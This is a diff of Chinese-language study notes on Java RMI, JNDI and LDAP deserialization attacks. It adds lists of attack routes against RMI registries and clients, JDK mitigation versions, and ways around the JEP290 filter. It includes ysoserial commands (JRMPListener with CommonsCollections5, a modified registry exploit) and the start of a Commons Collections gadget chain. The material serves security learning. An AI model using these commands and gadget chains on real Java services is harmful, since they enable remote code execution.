@@ -406,9 +406,9 @@ RMI的架构是这样的：
 
 + RMI Client：从registry获取stub，从stub中获取JNDI server addr，再请求server
 
-+ RMI Server：存储对象数据。不一定和Registry在同一个JVM。方法执行的地方，仅把方法返回值返回给Client
++ RMI Service Provider：存储对象数据。不一定和Registry在同一个JVM。方法执行的地方，仅把方法返回值返回给Client
 
-RMI存在动态类加载行为，即会先从本地CLASSPATH加载，如无则请求codebase加载。JDK 6u132、JDK 7u122、JDK 8u113  之后，系统属性 `com.sun.jndi.rmi.object.trustURLCodebase`、`com.sun.jndi.cosnaming.object.trustURLCodebase` 的默认值变为false，无法再通过直接的JNDI Reference + RMI达成攻击
+RMI存在动态类加载行为，即会先从本地CLASSPATH加载，如无则请求codebase加载。JDK 6u132、JDK 7u122、JDK 8u113  之后，系统属性 `com.sun.jndi.rmi.object.trustURLCodebase`、`com.sun.jndi.cosnaming.object.trustURLCodebase` 的默认值变为false，无法再通过直接的JNDI naming reference + RMI达成攻击
 
 需`System.setProperty("com.sun.jndi.rmi.object.trustURLCodebase", "true");`
 
@@ -426,7 +426,7 @@ javaSerializedData
 
 ## JNDI
 
-JNDI是Java的API，是一个上层封装。下层是RMI（JRMP协议传输）和LDAP等的具体实现（还有DNS，COBRA，IIOP等等）。本质就是在实现RPC（cross JVM）
+JNDI是Java的API，是一个上层封装（其实就是封装了多种协议而已），下层是RMI（JRMP协议传输）, CORBA和LDAP等的具体实现（还有DNS，COBRA，IIOP等等）。本质就是在实现RPC（cross JVM）
 
 ```java
 // RMI
@@ -504,19 +504,31 @@ LDAP：
 
 ### 总结一下JNDI的几种攻击方式
 
+攻击server
+
++ RMI Registry
++ RMI Service Provider
++ JEP290的攻击方式见下文
+
+攻击client
+
 + RMI + JRMP serialized data
 + RMI + JNDI naming reference
 + LDAP + JNDI naming reference
-+ 高于JDK8u191的两种利用方式
++ RMI + local gadgets
++ LDAP + local gadgets
++ LDAP + local reference factory
 
 ## 安全限制
 
-+ RMI codebase：`5u45、6u45、7u21、8u121`
++ RMI codebase：`5u45, 6u45, 7u21, 8u121`
 
-+ LDAP codebase：`JDK11.0.1、8u191、7u201、6u211`
++ LDAP codebase：`JDK11.0.1, 8u191, 7u201, 6u211`
 
-+ JEP290：反序列化过程中增加`filterCheck`
++ JEP290：反序列化过程中增加`filterCheck`，`6u141, 7u131, 8u121, jdk9`后增加
 
+  `sun/rmi/registry/RegistryImpl.java`中：
+  
   ```java
   if (String.class == clazz
       || java.lang.Number.class.isAssignableFrom(clazz)
@@ -530,20 +542,27 @@ LDAP：
       return ObjectInputFilter.Status.ALLOWED;
   } else {
       return ObjectInputFilter.Status.REJECTED;
-  }
+}
   ```
 
+  **攻击Registry**
+  
   `ysoserial.payload.JRMPClient`中使用UnicastRef绕过
-
+  
   ```
   java -cp ysoserial.jar ysoserial.exploit.JRMPListener 23333 CommonsCollections5 calc
   
-  // RMINop是我自己改了RMIRegistryExploit，直接bind，不要封装Proxy
+  // RMINop是我自己改了RMIRegistryExploit，直接bind，不封装Proxy
   java -cp ysoserial.jar ysoserial.exploit.RMINop 127.0.0.1 9999 JRMPClient 127.0.0.1:2333
   ```
-
   
   PowerShell直接重定向的话，由于默认UTF-16LE编码，序列化数据魔数会出错，Windows10 1903上使用cmd没问题
+
+  **攻击Service Provider**
+
+  Registry注册的接口存在以Object为参数的方法，远程调用时即可传递序列化的Object参数
+
+  因为JEP290防护的仅仅是`Registry`，而处理远程调用的是`Service Provider`，没有反序列化白名单
 
 ## Gadgets
 
@@ -596,7 +615,7 @@ public Object transform(Object object) {
 
 调用链很好理解：
 
-​```java
+```java
 Transformer[] transformers = new Transformer[]{
     new ConstantTransformer(Runtime.class),
     new InvokerTransformer("getMethod", new Class[]{String.class, Class[].class}, new Object[]{"getRuntime", new Class[0]}),
